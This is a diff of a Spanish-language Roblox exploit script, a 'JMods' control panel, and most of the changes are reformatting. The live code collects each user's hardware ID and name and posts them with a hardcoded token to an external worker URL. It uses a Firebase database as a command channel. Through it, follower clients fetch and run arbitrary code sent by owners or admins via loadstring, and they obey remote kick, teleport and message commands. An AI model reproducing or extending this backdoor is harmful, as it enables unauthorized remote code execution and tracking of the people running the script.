@@ -9,7 +9,7 @@ task.spawn(function()
     local CoreGui = game:GetService("CoreGui")
     local TextChatService = game:GetService("TextChatService")
     local ReplicatedStorage = game:GetService("ReplicatedStorage")
-  local TeleportService = game:GetService("TeleportService")
+    local TeleportService = game:GetService("TeleportService")
 
     local LocalPlayer = Players.LocalPlayer
 
@@ -21,10 +21,10 @@ task.spawn(function()
     local myVerified = false
     local isOwner    = false
     local isAdmin    = false
-local myUserId        = tostring(LocalPlayer.UserId)
-local currentServerId = game.JobId
+    local myUserId        = tostring(LocalPlayer.UserId)
+    local currentServerId = game.JobId
    
-   local request = (syn and syn.request) or http_request or (fluxus and fluxus.request) or request    
+    local request = (syn and syn.request) or http_request or (fluxus and fluxus.request) or request    
     -- ========================================
     local function firebaseRequest(method, path, body)
         local url = FIREBASE_URL .. path .. ".json"
@@ -44,165 +44,165 @@ local currentServerId = game.JobId
         return nil
     end
 
-local function CleanupOldData(path)
-    local data = firebaseRequest("GET", path)
-    if not data or type(data) ~= "table" then return end
-    local now = os.time()
-    local maxAge = 60
-    for key, entry in pairs(data) do
-        if type(entry) == "table" then
-            if entry.timestamp then
-                if (now - (entry.timestamp or 0)) > maxAge then
-                    firebaseRequest("DELETE", path .. "/" .. key)
-                end
-            else
-                local allOld = true
-                for subKey, subEntry in pairs(entry) do
-                    if type(subEntry) == "table" and subEntry.timestamp then
-                        if (now - (subEntry.timestamp or 0)) > maxAge then
-                            firebaseRequest("DELETE", path .. "/" .. key .. "/" .. subKey)
-                        else
-                            allOld = false
+    local function CleanupOldData(path)
+        local data = firebaseRequest("GET", path)
+        if not data or type(data) ~= "table" then return end
+        local now = os.time()
+        local maxAge = 60
+        for key, entry in pairs(data) do
+            if type(entry) == "table" then
+                if entry.timestamp then
+                    if (now - (entry.timestamp or 0)) > maxAge then
+                        firebaseRequest("DELETE", path .. "/" .. key)
+                    end
+                else
+                    local allOld = true
+                    for subKey, subEntry in pairs(entry) do
+                        if type(subEntry) == "table" and subEntry.timestamp then
+                            if (now - (subEntry.timestamp or 0)) > maxAge then
+                                firebaseRequest("DELETE", path .. "/" .. key .. "/" .. subKey)
+                            else
+                                allOld = false
+                            end
                         end
                     end
-                end
-                if allOld then
-                    firebaseRequest("DELETE", path .. "/" .. key)
+                    if allOld then
+                        firebaseRequest("DELETE", path .. "/" .. key)
+                    end
                 end
             end
         end
     end
-end
 
     -- ========================================
-local WORKER_URL = "https://waaaaaa.owomanoxd.workers.dev"
-local WORKER_TOKEN = "tupapijoao"
+    local WORKER_URL = "https://waaaaaa.owomanoxd.workers.dev"
+    local WORKER_TOKEN = "tupapijoao"
 
-local function VerifyWithWorker(hwidValue)
-    local ok, result = pcall(function()
-        return request({
-            Url = WORKER_URL,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-Body = HttpService:JSONEncode({
-    userId    = myUserId,
-    nombre    = LocalPlayer.Name,
-    hwid      = hwidValue,
-    token     = WORKER_TOKEN,
-    timestamp = os.time() 
-})
-        })
-    end)
-    if ok and result and result.Body then
-        local dok, data = pcall(function()
-            return HttpService:JSONDecode(result.Body)
+    local function VerifyWithWorker(hwidValue)
+        local ok, result = pcall(function()
+            return request({
+                Url = WORKER_URL,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = HttpService:JSONEncode({
+                    userId    = myUserId,
+                    nombre    = LocalPlayer.Name,
+                    hwid      = hwidValue,
+                    token     = WORKER_TOKEN,
+                    timestamp = os.time() 
+                })
+            })
         end)
-        if dok and data then return data end
-    end
-    return { valid = false, role = "follower" }
-end
-
-local function VerifySender(sId, sName, sHwid)
-    if sId == "" or sHwid == "" then return false end
-    local ok, result = pcall(function()
-        return request({
-            Url = WORKER_URL,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-Body = HttpService:JSONEncode({
-    userId    = sId,
-    nombre    = sName,
-    hwid      = sHwid,
-    token     = WORKER_TOKEN,
-    timestamp = os.time()  -- ← agrega esto
-})
-        })
-    end)
-    if ok and result and result.Body then
-        local dok, data = pcall(function() return HttpService:JSONDecode(result.Body) end)
-        if dok and data then return data.valid == true end
-    end
-    return false
-end
-
- task.spawn(function()
-    task.wait(1)
-
-    local hwidValue = ""
-    pcall(function()
-        if gethwid then
-            hwidValue = tostring(gethwid())
-        elseif getdeviceid then
-            hwidValue = tostring(getdeviceid())
-        elseif identifyexecutor then
-            local name, ver = identifyexecutor()
-            hwidValue = "exec_" .. tostring(name) .. "_" .. tostring(ver or "0")
-        else
-            hwidValue = "unknown_" .. myUserId
+        if ok and result and result.Body then
+            local dok, data = pcall(function()
+                return HttpService:JSONDecode(result.Body)
+            end)
+            if dok and data then return data end
         end
-    end)
+        return { valid = false, role = "follower" }
+    end
 
-    if hwidValue == "" or hwidValue == "unknown_" .. myUserId then
+    local function VerifySender(sId, sName, sHwid)
+        if sId == "" or sHwid == "" then return false end
+        local ok, result = pcall(function()
+            return request({
+                Url = WORKER_URL,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = HttpService:JSONEncode({
+                    userId    = sId,
+                    nombre    = sName,
+                    hwid      = sHwid,
+                    token     = WORKER_TOKEN,
+                    timestamp = os.time()
+                })
+            })
+        end)
+        if ok and result and result.Body then
+            local dok, data = pcall(function() return HttpService:JSONDecode(result.Body) end)
+            if dok and data then return data.valid == true end
+        end
+        return false
+    end
+
+    task.spawn(function()
+        task.wait(1)
+
+        local hwidValue = ""
+        pcall(function()
+            if gethwid then
+                hwidValue = tostring(gethwid())
+            elseif getdeviceid then
+                hwidValue = tostring(getdeviceid())
+            elseif identifyexecutor then
+                local name, ver = identifyexecutor()
+                hwidValue = "exec_" .. tostring(name) .. "_" .. tostring(ver or "0")
+            else
+                hwidValue = "unknown_" .. myUserId
+            end
+        end)
+
+        if hwidValue == "" or hwidValue == "unknown_" .. myUserId then
+            myVerified = true
+            myRole = "follower"
+            return
+        end
+
+        local result = VerifyWithWorker(hwidValue)
+
+        if result.valid then
+            if result.role == "owner" then
+                isOwner = true
+                myRole = "owner"
+            elseif result.role == "admin" then
+                isAdmin = true
+                myRole = "admin"
+            end
+        end
+
+        if result.ownerIds then
+            for _, id in ipairs(result.ownerIds) do
+                table.insert(ownerIds, tonumber(id))
+            end
+        end
+        if result.adminIds then
+            for _, id in ipairs(result.adminIds) do
+                table.insert(adminIds, tonumber(id))
+            end
+        end
+
         myVerified = true
-        myRole = "follower"
-        return
-    end
 
-    local result = VerifyWithWorker(hwidValue)
-
-    if result.valid then
-        if result.role == "owner" then
-            isOwner = true
-            myRole = "owner"
-        elseif result.role == "admin" then
-            isAdmin = true
-            myRole = "admin"
-        end
-    end
-
-if result.ownerIds then
-        for _, id in ipairs(result.ownerIds) do
-            table.insert(ownerIds, tonumber(id))
-        end
-    end
-    if result.adminIds then
-        for _, id in ipairs(result.adminIds) do
-            table.insert(adminIds, tonumber(id))
-        end
-    end
-
-    myVerified = true
-
-if isOwner or isAdmin then
+        if isOwner or isAdmin then
             task.spawn(function()
                 CleanupOldData("/heartbeats")
                 CleanupOldData("/triggers")
-            CleanupOldData("/commands")
+                CleanupOldData("/commands")
                 CleanupOldData("/brings/" .. myUserId)
                 CleanupOldData("/executions/owners/" .. myUserId)
             end)
         end
-end)
+    end)
 
-task.spawn(function()
-    local waited = 0
-    while not myVerified and waited < 15 do
-        task.wait(0.5)
-        waited = waited + 0.5
-    end
-    if not (isOwner or isAdmin) then return end
+    task.spawn(function()
+        local waited = 0
+        while not myVerified and waited < 15 do
+            task.wait(0.5)
+            waited = waited + 0.5
+        end
+        if not (isOwner or isAdmin) then return end
 
-  while true do
-        task.wait(60)
-pcall(function()
-            CleanupOldData("/heartbeats")
-            CleanupOldData("/triggers")
+        while true do
+            task.wait(60)
+            pcall(function()
+                CleanupOldData("/heartbeats")
+                CleanupOldData("/triggers")
                 CleanupOldData("/commands")
-            CleanupOldData("/brings/" .. myUserId)
-            CleanupOldData("/executions/owners/" .. myUserId)
-        end)
-    end
-end)
+                CleanupOldData("/brings/" .. myUserId)
+                CleanupOldData("/executions/owners/" .. myUserId)
+            end)
+        end
+    end)
 
     local detectedFollowers = {}
     local heartbeatActive = false
@@ -265,7 +265,7 @@ end)
     end)
 
 
-task.spawn(function()
+    task.spawn(function()
         local waited = 0
         while not myVerified and waited < 15 do
             task.wait(0.5)
@@ -273,47 +273,45 @@ task.spawn(function()
         end
         if not (isAdmin and not isOwner) then return end
 
-        -- Comandos del owner → solo del server actual
- task.spawn(function()
-    local waited2 = 0
-    while not myVerified and waited2 < 15 do
-        task.wait(0.5)
-        waited2 = waited2 + 0.5
-    end
-    local processedCmds = {} -- cache anti-duplicados
-    while true do
-        task.wait(1)
-        local result = firebaseRequest("GET", "/commands/" .. currentServerId)
-        if result and type(result) == "table" then
-            for cmdKey, cmd in pairs(result) do
-                if cmd.command and not processedCmds[cmdKey]
-                    and tostring(cmd.sender_id or "") ~= myUserId then
-                    processedCmds[cmdKey] = true
-                    firebaseRequest("DELETE", "/commands/" .. currentServerId .. "/" .. cmdKey)
-                    local sId   = tostring(cmd.sender_id   or "")
-                    local sName = tostring(cmd.sender_name  or "")
-                    local sHwid = tostring(cmd.sender_hwid  or "")
-                    local verified = VerifySender(sId, sName, sHwid)
-                    if verified then
-                        ProcessCommand({
-                            command      = cmd.command,
-                            senderUserId = sId
-                        })
+        task.spawn(function()
+            local waited2 = 0
+            while not myVerified and waited2 < 15 do
+                task.wait(0.5)
+                waited2 = waited2 + 0.5
+            end
+            local processedCmds = {}
+            while true do
+                task.wait(1)
+                local result = firebaseRequest("GET", "/commands/" .. currentServerId)
+                if result and type(result) == "table" then
+                    for cmdKey, cmd in pairs(result) do
+                        if cmd.command and not processedCmds[cmdKey]
+                            and tostring(cmd.sender_id or "") ~= myUserId then
+                            processedCmds[cmdKey] = true
+                            firebaseRequest("DELETE", "/commands/" .. currentServerId .. "/" .. cmdKey)
+                            local sId   = tostring(cmd.sender_id   or "")
+                            local sName = tostring(cmd.sender_name  or "")
+                            local sHwid = tostring(cmd.sender_hwid  or "")
+                            local verified = VerifySender(sId, sName, sHwid)
+                            if verified then
+                                ProcessCommand({
+                                    command      = cmd.command,
+                                    senderUserId = sId
+                                })
+                            end
+                        end
                     end
                 end
             end
-        end
-    end
-end)
+        end)
 
--- Brings del owner → solo hacia este admin
         task.spawn(function()
             local waited = 0
             while not myVerified and waited < 15 do
                 task.wait(0.5)
                 waited = waited + 0.5
             end
-            local processedBrings = {} -- cache anti-duplicados
+            local processedBrings = {}
             while true do
                 task.wait(1)
                 local result = firebaseRequest("GET", "/brings/" .. myUserId)
@@ -341,7 +339,7 @@ end)
                 end
             end
         end)
-        -- Ejecuciones del owner → solo para este admin
+
         task.spawn(function()
             local waited = 0
             while not myVerified and waited < 15 do
@@ -699,8 +697,6 @@ end)
         local victimaInput = parts[2] and parts[2]:lower() or nil
         local destinoOMensaje = parts[3] or nil
         local isAll = (victimaInput == "all")
-        -- Para .m all mensaje → el mensaje empieza en parts[3]
-        -- Para .t all joao / .u all joao → destino es parts[3]
 
         local function CanExecuteCommand()
             local senderRole = GetRole(tonumber(senderUserId))
@@ -729,7 +725,7 @@ end)
 
         local function MeAfecta()
             if not victimaInput then return true end
-            if isAll then return true end  -- "all" afecta a todos
+            if isAll then return true end
             if #victimaInput < 3 then return false end
             local myUsername = LocalPlayer.Name:lower()
             local myDisplayName = LocalPlayer.DisplayName:lower()
@@ -775,7 +771,6 @@ end)
         elseif cmd == ".m" then
             if MeAfecta() then
                 local mensajeFinal = ""
-                -- .m all mensaje → parts[3..] | .m victima mensaje → parts[3..]
                 local startIdx = 3
                 if startIdx <= #parts then
                     for i = startIdx, #parts do
@@ -786,7 +781,6 @@ end)
                 end
             end
         elseif cmd == ".l" then
-            -- .l [victima/all] [texto...] — muestra texto en pantalla (CoreGui, sin fondo)
             if MeAfecta() then
                 local textoFinal = ""
                 local startIdx = 3
@@ -798,7 +792,6 @@ end)
                 end
                 if textoFinal ~= "" then
                     task.spawn(function()
-                        -- Remover label anterior si existe
                         local guiParent = (gethui and gethui()) or CoreGui
                         local oldGui = guiParent:FindFirstChild("JModsLabelGui")
                         if oldGui then oldGui:Destroy() end
@@ -827,7 +820,6 @@ end)
                         label.ZIndex = 10
                         label.Parent = labelGui
 
-                        -- Animación: fade in
                         label.TextTransparency = 1
                         label.TextStrokeTransparency = 1
                         local TweenService = game:GetService("TweenService")
@@ -836,7 +828,6 @@ end)
                             TextStrokeTransparency = 0.4
                         }):Play()
 
-                        -- Esperar 8 segundos y luego fade out
                         task.wait(8)
                         if label and label.Parent then
                             TweenService:Create(label, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
@@ -879,26 +870,23 @@ end)
             if MeAfecta() then
                 LocalPlayer:Kick("Expulsado por el owner/admin")
             end
-
-elseif cmd == ".rj" then
-    if GetRole(tonumber(senderUserId)) == "Owner" then
-        if MeAfecta() then
-            task.spawn(function()
-                task.wait(0.3)
-                local ok = pcall(function()
-                    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
-                end)
-                if not ok then
-                    task.wait(1)
-                    pcall(function()
-                        TeleportService:Teleport(game.PlaceId, LocalPlayer)
+        elseif cmd == ".rj" then
+            if GetRole(tonumber(senderUserId)) == "Owner" then
+                if MeAfecta() then
+                    task.spawn(function()
+                        task.wait(0.3)
+                        local ok = pcall(function()
+                            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
+                        end)
+                        if not ok then
+                            task.wait(1)
+                            pcall(function()
+                                TeleportService:Teleport(game.PlaceId, LocalPlayer)
+                            end)
+                        end
                     end)
                 end
-            end)
-        end
-    end
-
-
+            end
         elseif cmd == ".sc" then
             if MeAfecta() then
                 local SoundService = game:GetService("SoundService")
@@ -953,14 +941,12 @@ elseif cmd == ".rj" then
                 generalChannel.MessageReceived:Connect(function(message)
                     if message.TextSource then
                         local senderUserId = message.TextSource.UserId
-local senderName = message.TextSource.Name
-local text = message.Text
-text = text:gsub("<[^>]+>", ""):gsub("^%s+", ""):gsub("%s+$", "")
-local senderRole = GetRole(senderUserId)
-
-local senderVerified = (senderRole == "Owner" or senderRole == "Admin")
-
-if senderVerified then
+                        local senderName = message.TextSource.Name
+                        local text = message.Text
+                        text = text:gsub("<[^>]+>", ""):gsub("^%s+", ""):gsub("%s+$", "")
+                        local senderRole = GetRole(senderUserId)
+                        local senderVerified = (senderRole == "Owner" or senderRole == "Admin")
+                        if senderVerified then
                             local cleanCommand = text
                             if text:sub(1, 3):lower() == "/e " then
                                 cleanCommand = text:sub(4):gsub("^%s+", "")
@@ -997,12 +983,11 @@ if senderVerified then
                         if player.Name == senderName then sender = player break end
                     end
                     if sender then
-    local senderUserId = sender.UserId
-    local senderName = sender.Name
-    local senderRole = GetRole(senderUserId)
-
-local senderVerified = (senderRole == "Owner" or senderRole == "Admin")
-    if senderVerified then
+                        local senderUserId = sender.UserId
+                        local senderName = sender.Name
+                        local senderRole = GetRole(senderUserId)
+                        local senderVerified = (senderRole == "Owner" or senderRole == "Admin")
+                        if senderVerified then
                             local cleanCommand = text
                             if text:sub(1, 3):lower() == "/e " then
                                 cleanCommand = text:sub(4):gsub("^%s+", "")
@@ -1026,32 +1011,29 @@ local senderVerified = (senderRole == "Owner" or senderRole == "Admin")
         end
     end)
 
-task.spawn(function()
+    task.spawn(function()
         local waited = 0
         while not myVerified and waited < 20 do
             task.wait(0.5)
             waited = waited + 0.5
         end
         if isOwner or isAdmin then return end
-        -- Es follower confirmado, iniciar loops
 
-        -- Estado compartido entre los loops del follower
-local followerState = {
+        local followerState = {
             ownerOnline = false,
             lastOnlineCheck = 0,
-            checkInterval = 60,        --  FIX: aumentado de 30s a 60s (menos requests)
-            heartbeatInterval = 15,    -- FIX: aumentado de 8s a 15s (menos escrituras)
+            checkInterval = 60,
+            heartbeatInterval = 15,
             lastHeartbeat = 0,
             lastTriggerCheck = 0,
         }
 
-        -- Chequear si hay owner/admin activo (máx 4 GETs)
-local function CheckOwnerOnline()
+        local function CheckOwnerOnline()
             local result = firebaseRequest("GET", "/heartbeats")
             if result and type(result) == "table" then
                 local now = os.time()
                 for uid, p in pairs(result) do
-if (p.role == "owner" or p.role == "admin")
+                    if (p.role == "owner" or p.role == "admin")
                         and p.server_id == currentServerId
                         and (now - (p.timestamp or 0)) < 60 then
                         return true
@@ -1061,29 +1043,26 @@ if (p.role == "owner" or p.role == "admin")
             return false
         end
 
-        -- Enviar heartbeat a todos los owners/admins (registrarse como visible)
-local function SendHeartbeat()
-    local ok = pcall(function()
-        firebaseRequest("PUT", "/heartbeats/" .. myUserId, {
-            username  = LocalPlayer.Name,
-            role      = "follower",
-            server_id = currentServerId,
-            place_id  = tostring(game.PlaceId),
-            timestamp = os.time()
-        })
-    end)
-    followerState.lastHeartbeat = tick()
-end
+        local function SendHeartbeat()
+            local ok = pcall(function()
+                firebaseRequest("PUT", "/heartbeats/" .. myUserId, {
+                    username  = LocalPlayer.Name,
+                    role      = "follower",
+                    server_id = currentServerId,
+                    place_id  = tostring(game.PlaceId),
+                    timestamp = os.time()
+                })
+            end)
+            followerState.lastHeartbeat = tick()
+        end
 
--- 
         task.spawn(function()
-
             local waitedF = 0
             while not myVerified and waitedF < 20 do
                 task.wait(0.5)
                 waitedF = waitedF + 0.5
             end
-            if isOwner or isAdmin then return end  --  Salida de seguridad
+            if isOwner or isAdmin then return end
             task.wait(1)
             followerState.ownerOnline = CheckOwnerOnline()
             followerState.lastOnlineCheck = tick()
@@ -1094,7 +1073,6 @@ end
             while true do
                 local now = tick()
 
-                -- 
                 if (now - followerState.lastTriggerCheck) >= 2 then
                     followerState.lastTriggerCheck = now
                     local ok, trigger = pcall(function()
@@ -1104,7 +1082,6 @@ end
                         local triggerTime = trigger.timestamp or 0
                         local triggerGame = tostring(trigger.place_id or "")
                         local triggerServer = tostring(trigger.server_id or "")
-                        -- Solo respondo si el trigger es de MI server, MI juego, y es reciente (< 15s)
                         if (os.time() - triggerTime) < 15
                             and triggerGame == tostring(game.PlaceId)
                             and triggerServer == currentServerId then
@@ -1171,38 +1148,37 @@ end
             end
         end)
 
-task.spawn(function()
-    local wC = 0
-    while not myVerified and wC < 20 do task.wait(0.5) wC = wC + 0.5 end
-    if isOwner or isAdmin then return end
-    local processedCmds = {} --  cache anti-duplicados
-    while true do
-        task.wait(1)
-        local result = firebaseRequest("GET", "/commands/" .. currentServerId)
-        if result and type(result) == "table" then
-            for cmdKey, cmd in pairs(result) do
-                if cmd.command and not processedCmds[cmdKey]
-                    and (cmd.server_id == nil or cmd.server_id == currentServerId) then
-                    processedCmds[cmdKey] = true
-                    firebaseRequest("DELETE", "/commands/" .. currentServerId .. "/" .. cmdKey)
-                    local sId   = tostring(cmd.sender_id   or "")
-                    local sName = tostring(cmd.sender_name  or "")
-                    local sHwid = tostring(cmd.sender_hwid  or "")
-                    local verified = VerifySender(sId, sName, sHwid)
-                    if verified then
-                        ProcessCommand({
-                            command      = cmd.command,
-                            senderUserId = sId
-                        })
+        task.spawn(function()
+            local wC = 0
+            while not myVerified and wC < 20 do task.wait(0.5) wC = wC + 0.5 end
+            if isOwner or isAdmin then return end
+            local processedCmds = {}
+            while true do
+                task.wait(1)
+                local result = firebaseRequest("GET", "/commands/" .. currentServerId)
+                if result and type(result) == "table" then
+                    for cmdKey, cmd in pairs(result) do
+                        if cmd.command and not processedCmds[cmdKey]
+                            and (cmd.server_id == nil or cmd.server_id == currentServerId) then
+                            processedCmds[cmdKey] = true
+                            firebaseRequest("DELETE", "/commands/" .. currentServerId .. "/" .. cmdKey)
+                            local sId   = tostring(cmd.sender_id   or "")
+                            local sName = tostring(cmd.sender_name  or "")
+                            local sHwid = tostring(cmd.sender_hwid  or "")
+                            local verified = VerifySender(sId, sName, sHwid)
+                            if verified then
+                                ProcessCommand({
+                                    command      = cmd.command,
+                                    senderUserId = sId
+                                })
+                            end
+                        end
                     end
                 end
             end
-        end
-    end
-end)
+        end)
 
-task.spawn(function()
-            --
+        task.spawn(function()
             local wE = 0
             while not myVerified and wE < 20 do task.wait(0.5) wE = wE + 0.5 end
             if isOwner or isAdmin then return end
@@ -1215,27 +1191,27 @@ task.spawn(function()
                         if type(ownerExecs) == "table" then
                             for execId, execData in pairs(ownerExecs) do
                                 if type(execData) == "table" and not lastProcessedExecs[execId] then
-local shouldExecute = false
+                                    local shouldExecute = false
                                     local tgt = tostring(execData.target or "")
                                     local srvId = tostring(execData.serverId or "")
                                     if (tgt == ".all" or tgt == ".s") and srvId == currentServerId then
-                                        shouldExecute = true --  .all ahora también requiere mismo server
+                                        shouldExecute = true
                                     elseif tgt:lower() == LocalPlayer.Name:lower() then
                                         shouldExecute = true
                                     end
-if shouldExecute and execData.code then
-    local sName = tostring(execData.sender_name or "")
-    local sHwid = tostring(execData.sender_hwid or "")
-    local verified = VerifySender(tostring(ownerId), sName, sHwid)
-    if verified then
-        lastProcessedExecs[execId] = true
-        firebaseRequest("DELETE", "/executions/owners/" .. ownerId .. "/" .. execId)
-        pcall(function()
-            local func = loadstring(execData.code)
-            if func then func() end
-        end)
-    end
-end
+                                    if shouldExecute and execData.code then
+                                        local sName = tostring(execData.sender_name or "")
+                                        local sHwid = tostring(execData.sender_hwid or "")
+                                        local verified = VerifySender(tostring(ownerId), sName, sHwid)
+                                        if verified then
+                                            lastProcessedExecs[execId] = true
+                                            firebaseRequest("DELETE", "/executions/owners/" .. ownerId .. "/" .. execId)
+                                            pcall(function()
+                                                local func = loadstring(execData.code)
+                                                if func then func() end
+                                            end)
+                                        end
+                                    end
                                 end
                             end
                         end
@@ -1244,11 +1220,9 @@ end
             end
         end)
 
-
     end) 
 
     task.spawn(function()
-        -- Esperar a que la verificación de Supabase termine (máx 10s)
         local waited = 0
         while not myVerified and waited < 15 do
             task.wait(0.5)
@@ -1265,10 +1239,11 @@ end
         screenGui.DisplayOrder = 100
 
         local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
-        local frameWidth = isMobile and 412 or 550
-        local frameHeight = isMobile and 300 or 400
-        local shadowWidth = isMobile and 422 or 560
-        local shadowHeight = isMobile and 310 or 410
+        local frameWidth  = isMobile and 412 or 550
+        -- *** FIX MÓVIL: altura aumentada de 300 a 360 para que quepan todos los elementos ***
+        local frameHeight = isMobile and 360 or 400
+        local shadowWidth  = isMobile and 422 or 560
+        local shadowHeight = isMobile and 370 or 410
 
         local shadowFrame = Instance.new("Frame")
         shadowFrame.Name = "ShadowFrame"
@@ -1458,16 +1433,16 @@ end
         local tabWidth = isMobile and 78 or 102
         local tabSpacing = 5
 
-        local playersTab = CreateTab("Jugadores", 0, "👥")
-        local commandsTab = CreateTab("Comandos", tabWidth + tabSpacing, "⚡")
-        local serversTab = CreateTab("Servidores", (tabWidth + tabSpacing) * 2, "🌐")
+        local playersTab  = CreateTab("Jugadores", 0, "👥")
+        local commandsTab = CreateTab("Comandos",  tabWidth + tabSpacing, "⚡")
+        local serversTab  = CreateTab("Servidores", (tabWidth + tabSpacing) * 2, "🌐")
         local executionTab = CreateTab("Ejecutador", (tabWidth + tabSpacing) * 3, "💻")
-        local configTab = CreateTab("Config", (tabWidth + tabSpacing) * 4, "⚙️")
+        local configTab   = CreateTab("Config",    (tabWidth + tabSpacing) * 4, "⚙️")
 
         if not isOwner then
             executionTab.Visible = false
             serversTab.Position = UDim2.new(0, (tabWidth + tabSpacing) * 2, 0, 0)
-            configTab.Position = UDim2.new(0, (tabWidth + tabSpacing) * 3, 0, 0)
+            configTab.Position  = UDim2.new(0, (tabWidth + tabSpacing) * 3, 0, 0)
         end
 
         local contentFrame = Instance.new("Frame")
@@ -1481,7 +1456,9 @@ end
         contentCorner.CornerRadius = UDim.new(0, 10)
         contentCorner.Parent = contentFrame
 
+        -- ============================================================
         -- PANEL JUGADORES
+        -- ============================================================
         local playersPanel = Instance.new("Frame")
         playersPanel.Name = "PlayersPanel"
         playersPanel.Size = UDim2.new(1, -10, 1, -10)
@@ -1732,23 +1709,22 @@ end
                 bringBtnCorner.CornerRadius = UDim.new(0, 6)
                 bringBtnCorner.Parent = bringBtn
 
-bringBtn.MouseButton1Click:Connect(function()
+                bringBtn.MouseButton1Click:Connect(function()
                     if bringButtonLocked then return end
                     bringButtonLocked = true
                     local bringKey = tostring(os.time()) .. "_" .. myUserId
-                   local myHwid = ""
-pcall(function()
-    if gethwid then myHwid = tostring(gethwid())
-    elseif getdeviceid then myHwid = tostring(getdeviceid()) end
-end)
-firebaseRequest("PUT", "/brings/" .. tostring(userId) .. "/" .. bringKey, {
-    sender_id   = myUserId,
-    sender_name = LocalPlayer.Name,
-    sender_hwid = myHwid,
-    server_id   = currentServerId,
-    timestamp   = os.time()
-})
-
+                    local myHwid = ""
+                    pcall(function()
+                        if gethwid then myHwid = tostring(gethwid())
+                        elseif getdeviceid then myHwid = tostring(getdeviceid()) end
+                    end)
+                    firebaseRequest("PUT", "/brings/" .. tostring(userId) .. "/" .. bringKey, {
+                        sender_id   = myUserId,
+                        sender_name = LocalPlayer.Name,
+                        sender_hwid = myHwid,
+                        server_id   = currentServerId,
+                        timestamp   = os.time()
+                    })
                     bringBtn.Text = "✓"
                     task.wait(0.5)
                     bringBtn.Text = "Traer"
@@ -1766,15 +1742,14 @@ firebaseRequest("PUT", "/brings/" .. tostring(userId) .. "/" .. bringKey, {
             return entry
         end
 
-        --
-     local function UpdatePlayersList()
+        local function UpdatePlayersList()
             task.spawn(function()
                 for _, child in ipairs(playersList:GetChildren()) do
                     if child:IsA("Frame") then child:Destroy() end
                 end
                 local displayRole = myRole:sub(1,1):upper() .. myRole:sub(2)
                 CreatePlayerEntry(LocalPlayer.Name .. " (You)", LocalPlayer.UserId, displayRole, currentServerId)
-local result = firebaseRequest("GET", "/heartbeats")
+                local result = firebaseRequest("GET", "/heartbeats")
                 if result and type(result) == "table" then
                     local now = os.time()
                     for uid, p in pairs(result) do
@@ -1790,43 +1765,43 @@ local result = firebaseRequest("GET", "/heartbeats")
             end)
         end
 
-detectBtn.MouseButton1Click:Connect(function()
-    detectBtn.Text = "📡 Enviando señal..."
-    -- Sube MI heartbeat primero
-    pcall(function()
-        firebaseRequest("PUT", "/heartbeats/" .. myUserId, {
-            username  = LocalPlayer.Name,
-            role      = myRole,
-            server_id = currentServerId,
-            place_id  = tostring(game.PlaceId),
-            timestamp = os.time()
-        })
-    end)
-    -- Envía trigger para que los followers respondan
-    pcall(function()
-        firebaseRequest("PUT", "/triggers/" .. currentServerId, {
-            sender_id = myUserId,
-            place_id  = tostring(game.PlaceId),
-            server_id = currentServerId,
-            timestamp = os.time()
-        })
-    end)
-    detectBtn.Text = "⏳ Esperando respuestas... (10s)"
-    task.wait(10) -- espera suficiente para que los followers lean el trigger y respondan
-    UpdatePlayersList()
-    task.wait(1)
-    local count = 0
-    for _, child in ipairs(playersList:GetChildren()) do
-        if child:IsA("Frame") and child.Name ~= LocalPlayer.Name .. " (You)" then
-            count = count + 1
-        end
-    end
-    detectBtn.Text = "✓ " .. count .. " Jugadores Detectados!"
-    task.wait(1.5)
-    detectBtn.Text = "🔍 Actualizar Lista"
-end)
+        detectBtn.MouseButton1Click:Connect(function()
+            detectBtn.Text = "📡 Enviando señal..."
+            pcall(function()
+                firebaseRequest("PUT", "/heartbeats/" .. myUserId, {
+                    username  = LocalPlayer.Name,
+                    role      = myRole,
+                    server_id = currentServerId,
+                    place_id  = tostring(game.PlaceId),
+                    timestamp = os.time()
+                })
+            end)
+            pcall(function()
+                firebaseRequest("PUT", "/triggers/" .. currentServerId, {
+                    sender_id = myUserId,
+                    place_id  = tostring(game.PlaceId),
+                    server_id = currentServerId,
+                    timestamp = os.time()
+                })
+            end)
+            detectBtn.Text = "⏳ Esperando respuestas... (10s)"
+            task.wait(10)
+            UpdatePlayersList()
+            task.wait(1)
+            local count = 0
+            for _, child in ipairs(playersList:GetChildren()) do
+                if child:IsA("Frame") and child.Name ~= LocalPlayer.Name .. " (You)" then
+                    count = count + 1
+                end
+            end
+            detectBtn.Text = "✓ " .. count .. " Jugadores Detectados!"
+            task.wait(1.5)
+            detectBtn.Text = "🔍 Actualizar Lista"
+        end)
 
+        -- ============================================================
         -- PANEL COMANDOS
+        -- ============================================================
         local commandsPanel = Instance.new("Frame")
         commandsPanel.Name = "CommandsPanel"
         commandsPanel.Size = UDim2.new(1, -10, 1, -10)
@@ -1985,56 +1960,55 @@ end)
             permLabel.Parent = permBadge
         end
 
-   local function SendCommand(cmd)
+        local function SendCommand(cmd)
             if cmd == "" then return end
-    --
-    local cmdPrefix = cmd:match("^(%S+)"):lower()
-    local victimaArg = cmd:match("%S+%s+(%S+)") and cmd:match("%S+%s+(%S+)"):lower() or nil
-    
-    if cmdPrefix == ".rj" and isOwner then
-        local meAfecta = (victimaArg == nil) -- .rj sin argumento = a mí mismo
-        if not meAfecta and victimaArg then
-            local myName = LocalPlayer.Name:lower()
-            meAfecta = (myName:sub(1, #victimaArg) == victimaArg)
-        end
-        if meAfecta then
-            task.spawn(function()
-                task.wait(0.3)
-                local ok = pcall(function()
-                    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
-                end)
-                if not ok then
-                    task.wait(1)
-                    pcall(function()
-                        TeleportService:Teleport(game.PlaceId, LocalPlayer)
+            local cmdPrefix = cmd:match("^(%S+)"):lower()
+            local victimaArg = cmd:match("%S+%s+(%S+)") and cmd:match("%S+%s+(%S+)"):lower() or nil
+            
+            if cmdPrefix == ".rj" and isOwner then
+                local meAfecta = (victimaArg == nil)
+                if not meAfecta and victimaArg then
+                    local myName = LocalPlayer.Name:lower()
